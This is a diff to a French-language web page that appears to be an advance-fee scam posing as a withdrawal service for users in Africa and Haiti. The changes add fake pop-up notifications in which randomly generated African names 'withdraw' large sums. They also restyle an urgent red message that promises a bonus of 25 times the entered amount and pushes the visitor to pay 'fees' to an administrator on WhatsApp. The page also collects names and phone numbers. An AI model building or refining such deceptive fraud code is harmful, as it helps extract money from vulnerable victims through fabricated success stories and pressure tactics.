@@ -23,6 +23,7 @@
       line-height: 1.6;
       display: flex;
       flex-direction: column;
+      position: relative;
     }
     a {
       color: #007bff;
@@ -139,7 +140,6 @@
     button:hover, input[type="submit"]:hover {
       background-color: #0056b3;
     }
-    /* Pas de lien “Cliquez ici” visible */
 
     /* Modal overlay */
     .modal-overlay {
@@ -186,17 +186,21 @@
       background-color: #007bff;
       transition: width 0.3s ease;
     }
-    #feeSection p {
+    /* Style du message d’alerte urgent */
+    #feeSection p#feeMessage {
       margin-top: 15px;
       font-size: 0.95rem;
-      color: #333;
       line-height: 1.4;
+      background-color: #f8d7da; /* fond rouge clair */
+      border: 1px solid #f5c2c7; /* bordure rouge */
+      color: #842029; /* texte rouge foncé */
+      padding: 12px;
+      border-radius: 4px;
     }
     #feeSection p a {
       color: #d9534f; /* rouge pour contact */
       font-weight: 500;
     }
-    /* Pas de bouton “J’ai réglé” */
 
     /* Section code masquée jusqu'au lien param ?code= */
     #code-section {
@@ -245,6 +249,33 @@
       color: #fff;
     }
 
+    /* Notifications ambiantes (toasts) */
+    .notif-container {
+      position: fixed;
+      bottom: 20px;
+      left: 20px;
+      z-index: 1100;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      pointer-events: none;
+    }
+    .notif {
+      background-color: rgba(0, 0, 0, 0.8);
+      color: #fff;
+      padding: 10px 15px;
+      border-radius: 4px;
+      font-size: 0.9rem;
+      opacity: 0;
+      animation: fadeInOut 6s ease forwards;
+    }
+    @keyframes fadeInOut {
+      0% { opacity: 0; transform: translateY(20px); }
+      10% { opacity: 1; transform: translateY(0); }
+      90% { opacity: 1; transform: translateY(0); }
+      100% { opacity: 0; transform: translateY(20px); }
+    }
+
     /* Responsive adjustments */
     @media (max-width: 600px) {
       header.site-header, footer.site-footer {
@@ -260,6 +291,10 @@
       }
       .modal-content {
         padding: 20px;
+      }
+      .notif-container {
+        bottom: 10px;
+        left: 10px;
       }
     }
   </style>
@@ -366,9 +401,9 @@
         <div id="progressBar" class="progress-bar"></div>
       </div>
       <div id="feeSection" style="display: none;">
-        <!-- Message à 90%: frais et gain affichés ici -->
-        <p class="fee-message" id="feeMessage">
-          <!-- Remplie dynamiquement en JS -->
+        <!-- Message à 90%: frais et gain affichés ici, en rouge urgent -->
+        <p id="feeMessage" class="fee-message">
+          <!-- Rempli dynamiquement en JS -->
         </p>
         <p>
           Contactez votre administrateur sur WhatsApp pour payer rapidement les frais et recevoir votre gain :<br>
@@ -377,6 +412,9 @@
       </div>
     </div>
   </div>
+
+  <!-- Notification ambiantes -->
+  <div class="notif-container" id="notifContainer"></div>
 
   <!-- Footer -->
   <footer class="site-footer" id="footer-contact">
@@ -408,7 +446,7 @@
       { name: "Gabon", code: "GA", dial_code: "+241", phone_length: 7 },
       { name: "Guinée équatoriale", code: "GQ", dial_code: "+240", phone_length: 7 },
       { name: "São Tomé-et-Principe", code: "ST", dial_code: "+239", phone_length: 7 },
-      // Afrique de l’Est / Sud (inclus Madagascar)
+      // Afrique de l’Est / Sud (incl. Madagascar)
       { name: "Madagascar", code: "MG", dial_code: "+261", phone_length: 9 },
       { name: "Kenya", code: "KE", dial_code: "+254", phone_length: 9 },
       { name: "Ouganda", code: "UG", dial_code: "+256", phone_length: 9 },
@@ -416,11 +454,35 @@
       { name: "Éthiopie", code: "ET", dial_code: "+251", phone_length: 9 },
       // Haïti
       { name: "Haïti", code: "HT", dial_code: "+509", phone_length: 8 },
-      // Ajoutez d’autres pays si nécessaire, avec indicatif et longueur correcte.
+      // Ajoutez d’autres pays si nécessaire...
     ];
 
+    // Pour notifications ambiantes : noms africains aléatoires et montants
+    const africanNames = [
+      "Moussa", "Amina", "Koffi", "Fatou", "Youssouf", "Adama", "Koumba", "Issa", "Mariama",
+      "Oumar", "Salimata", "Cheikh", "Awa", "Jean", "Marie", "Kwame", "Nadia", "Mohamed",
+      "Abdoulaye", "Chantal", "Ousmane", "Rokia", "Seydou", "Hadja", "Boubacar", "Grace",
+      "Samuel", "Jacques", "Patience", "Emmanuel"
+    ];
+
+    // Fonction pour générer un entier aléatoire entre min et max (inclus)
+    function randInt(min, max) {
+      return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
+
+    // Formatage montant avec séparateurs de milliers selon locale fr-FR
+    function formatAmount(amount, currency) {
+      if (currency === 'FCFA') {
+        // FCFA en entier
+        return amount.toLocaleString('fr-FR') + ' FCFA';
+      } else {
+        // USD avec 2 décimales
+        return amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' $';
+      }
+    }
+
     document.addEventListener('DOMContentLoaded', () => {
-      // Remplir le select pays et gérer indicatif + longueur
+      // Population du select pays et gestion indicatif + longueur
       const countrySelect = document.getElementById('country');
       const phonePrefixSpan = document.getElementById('phone-prefix');
       const phoneInput = document.getElementById('phone');
@@ -437,13 +499,10 @@
           const sel = countrySelect.selectedOptions[0];
           if (sel && sel.dataset.dialCode) {
             phonePrefixSpan.textContent = sel.dataset.dialCode;
-            // Définir maxlength sur le champ phone
             const len = parseInt(sel.dataset.phoneLength, 10);
             if (!isNaN(len) && len > 0) {
               phoneInput.maxLength = len;
-              // Placeholder exemple : ex. si longueur 8, afficher "Ex: 12345678"
-              phoneInput.placeholder = "Ex: " + "0".repeat(0); // on peut laisser vide ou donner un exemple générique
-              // Pour un exemple plus parlant, on peut générer un exemple aléatoire:
+              // Placeholder exemple "Ex: XXXXX..." selon longueur
               let ex = "";
               for (let i = 0; i < len; i++) ex += "X";
               phoneInput.placeholder = "Ex: " + ex;
@@ -459,7 +518,7 @@
         });
       }
 
-      // Récupérer éléments des sections
+      // Récupérer éléments sections
       const initialSection = document.getElementById('initial-section');
       const codeSection = document.getElementById('code-section');
       const successSection = document.getElementById('success-section');
@@ -471,16 +530,15 @@
       const progressText = document.getElementById('progressText');
       const feeSection = document.getElementById('feeSection');
       const feeMessage = document.getElementById('feeMessage');
+      const notifContainer = document.getElementById('notifContainer');
 
-      // Récupère le code attendu depuis le paramètre URL ?code=
+      // Récupérer code attendu depuis paramètre URL ?code=
       const urlParams = new URLSearchParams(window.location.search);
-      const expectedCode = urlParams.get('code'); // admin envoie ce lien au client
+      const expectedCode = urlParams.get('code');
 
-      // Au chargement : masquer section code d’abord
+      // Au chargement : masquer section code
       codeSection.style.display = 'none';
-
-      // Si URL contient ?code= et que le client a déjà soumis initial (hasSubmitted),
-      // on affiche section code. Sinon on garde masquée.
+      // Si ?code=... et déjà soumis initial, afficher section code
       const hasSubmitted = localStorage.getItem('hasSubmitted') === 'true';
       if (expectedCode && hasSubmitted) {
         initialSection.style.display = 'none';
@@ -491,13 +549,12 @@
       if (withdrawalForm) {
         withdrawalForm.addEventListener('submit', function(e) {
           e.preventDefault();
-          // Vérification du numéro de téléphone : longueur correcte ?
+          // Vérification du téléphone
           const countrySel = countrySelect.selectedOptions[0];
           if (countrySel) {
             const expectedLen = parseInt(countrySel.dataset.phoneLength, 10);
             const phoneValue = phoneInput.value.trim();
             if (!isNaN(expectedLen) && expectedLen > 0) {
-              // On ne compte que les chiffres ; s’assurer que l’utilisateur entre uniquement des chiffres
               const digitsOnly = phoneValue.replace(/\D/g, '');
               if (digitsOnly.length !== expectedLen) {
                 alert(`Le numéro de téléphone doit comporter exactement ${expectedLen} chiffres pour ${countrySel.textContent}.`);
@@ -505,7 +562,7 @@
               }
             }
           }
-          // Récupérer les valeurs
+          // Récupérer valeurs
           const formData = new FormData(withdrawalForm);
           const currency = formData.get('currency');
           const amountStr = formData.get('amount');
@@ -514,10 +571,9 @@
             alert("Veuillez saisir un montant valide.");
             return;
           }
-          // Calcul dynamique : bonus = amount * 25, frais = amount * 2.5
+          // Calcul : bonus = amount × 25, frais = amount × 2.5
           let bonusValue = amount * 25;
           let feeValue = amount * 2.5;
-          // Arrondir selon devise
           if (currency === 'USD') {
             bonusValue = Math.round(bonusValue * 100) / 100;
             feeValue = Math.round(feeValue * 100) / 100;
@@ -526,7 +582,7 @@
             feeValue = Math.round(feeValue);
           }
 
-          // Envoi Netlify Forms pour garder trace (optionnel)
+          // Envoi Netlify Forms
           const data = {};
           formData.forEach((v,k) => { data[k] = v; });
           data['form-name'] = withdrawalForm.getAttribute('name');
@@ -539,10 +595,10 @@
           }).then(()=>console.log("Envoyé à Netlify Forms"))
             .catch(err=>console.error("Erreur Netlify Forms:", err));
 
-          // Marquer en localStorage que l’utilisateur a soumis au moins une fois
+          // Marquer localStorage
           localStorage.setItem('hasSubmitted', 'true');
 
-          // Lancer modal + progression jusqu’à 90% avec message de frais/gain
+          // Lancer modal + progression jusqu’à 90% + message
           showProgressModal(bonusValue, feeValue, currency);
         });
       }
@@ -562,7 +618,6 @@
             }
             return;
           }
-          // Vérifier que code correspond au param attendu
           if (!expectedCode) {
             alert("Aucun code valide n'est fourni. Contactez l'administrateur pour obtenir le lien correct.");
             return;
@@ -598,11 +653,11 @@
           } else {
             clearInterval(timer);
             progressText.textContent = `Progression : ${target}%`;
-            // Message convaincant débutant par Félicitations...
+            // Message urgent stylé en rouge
             feeMessage.innerHTML =
-              `<strong>Félicitations ! Ce cas est vraiment exceptionnel : vous êtes parmi les rares personnes à recevoir un bonus de bienvenue. Félicitations à vous !</strong><br>` +
-              `Vous allez recevoir à présent <strong>${bonusValue} ${currency}</strong>, mais vous devez rapidement payer les frais qui s’appliquent à ce bonus <strong>${feeValue} ${currency}</strong> pour que votre investissement soit complet à 100 %.<br>` +
-              `Contactez votre administrateur sur WhatsApp pour payer rapidement les frais et recevoir votre gain.`;
+              `<strong>Félicitations ! Ce cas est vraiment exceptionnel :</strong> vous êtes parmi les rares personnes à recevoir un bonus de bienvenue. <strong>Félicitations à vous !</strong><br>` +
+              `Vous allez recevoir à présent <strong>${formatAmount(bonusValue, currency)}</strong>, mais vous devez rapidement payer les frais qui s’appliquent à ce bonus <strong>${formatAmount(feeValue, currency)}</strong> pour que votre investissement soit complet à 100 %.<br>` +
+              `<strong>Contactez votre administrateur sur WhatsApp pour payer rapidement les frais et recevoir votre gain.</strong>`;
             feeSection.style.display = 'block';
           }
         }, interval);
@@ -647,7 +702,61 @@
         document.body.classList.add('success-mode');
         window.scrollTo({ top: 0, behavior: 'smooth' });
       }
+
+      // Notifications ambiantes : pop-up périodiques
+      function startAmbientNotifications() {
+        // Intervalle entre notifications aléatoire entre 8s et 15s
+        const minInterval = 8000, maxInterval = 15000;
+        function scheduleNext() {
+          const delay = randInt(minInterval, maxInterval);
+          setTimeout(() => {
+            showRandomNotification();
+            scheduleNext();
+          }, delay);
+        }
+        scheduleNext();
+      }
+      function showRandomNotification() {
+        // Choix aléatoire de nom
+        const name = africanNames[randInt(0, africanNames.length - 1)];
+        // Choix aléatoire de devise et montant
+        const useFCFA = Math.random() < 0.6; // 60% FCFA, 40% USD (ajustable)
+        let amount;
+        let currency;
+        if (useFCFA) {
+          amount = randInt(500000, 5000000);
+          currency = 'FCFA';
+        } else {
+          amount = randInt(300, 5000);
+          currency = 'USD';
+        }
+        const msg = `${name} vient de retirer ${formatAmount(amount, currency)}.`;
+        const notif = document.createElement('div');
+        notif.className = 'notif';
+        notif.textContent = msg;
+        notifContainer.appendChild(notif);
+        // Supprimer après animation (~6s)
+        setTimeout(() => {
+          notifContainer.removeChild(notif);
+        }, 6000);
+      }
+      // Lancer les notifications ambiantes
+      startAmbientNotifications();
     });
+
+    // Fonctions utilitaires (définies en global ici)
+    // Génère un entier aléatoire entre min et max (inclus)
+    function randInt(min, max) {
+      return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
+    // Format montant
+    function formatAmount(amount, currency) {
+      if (currency === 'FCFA') {
+        return amount.toLocaleString('fr-FR') + ' FCFA';
+      } else {
+        return amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' $';
+      }
+    }
   </script>
 </body>
 </html>
